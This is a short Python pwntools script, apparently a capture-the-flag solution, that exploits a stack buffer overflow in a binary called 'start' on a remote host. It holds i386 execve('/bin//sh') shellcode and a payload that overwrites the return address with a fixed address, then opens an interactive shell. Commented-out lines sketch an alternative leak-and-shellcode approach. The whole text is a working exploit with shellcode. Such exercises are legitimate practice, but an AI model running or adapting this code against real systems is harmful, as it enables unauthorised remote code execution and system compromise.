from pwn import *

# p = process('./start')
p = remote('104.154.106.182', 2345)
context.arch = 'i386'
shellcode = '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
# shellcode = asm('\n'.join([
#     'push %d' % u32('/sh\0'),
#     'push %d' % u32('/bin'),
#     'xor edx, edx',
#     'xor ecx, ecx',
#     'mov ebx, esp',
#     'mov eax, 0xb',
#     'int 0x80',
# ]))

p.recvuntil('name: ')
p.sendline('a'*0x90 + 'b'*0x8 + p32(0x080484ad))
p.recv()
# ret = u32(p.recv()[:4]) + 0x14
# p.send('a'*0x14 + p32(ret) + shellcode)
p.interactive()
